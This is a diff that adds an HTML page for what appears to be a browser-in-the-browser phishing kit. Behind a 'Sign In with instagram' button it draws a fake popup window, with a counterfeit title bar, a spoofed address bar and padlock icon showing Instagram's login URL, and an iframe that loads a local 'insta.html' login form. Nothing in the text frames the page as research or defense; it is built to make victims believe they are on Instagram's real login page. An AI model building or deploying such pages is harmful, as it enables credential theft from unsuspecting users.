@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+        <link href='https://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
+        <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700%7CRoboto:300,400,500,900&amp;display=swap" rel="stylesheet" type="text/css">
+        
+        <link rel="stylesheet" href="css/css-dark.css" type="text/css">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+</head>
+<body>
+<h3 align="center">
+To continue</h3>
+<button id="clickme" style="margin-left:auto; margin-right: auto; margin-top: 2.5%; text-align: center; display: block; color='red'" class="btn btn-3 btn-sep icon-heart">Sign In with instagram</button>
+
+<div id="window" style="margin:auto; position: relative; bottom: 2.5%; display: none;">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="./logo.svg" width="20px" height="15px" id="logo">
+			<span id="logo-description">Login &bull; Instagram</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https//www.instagram.com</span>
+		<span id="domain-path">/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Flogin%2F%3F__coig_login%3D1</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="insta.html" frameBorder="10" align="center"></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
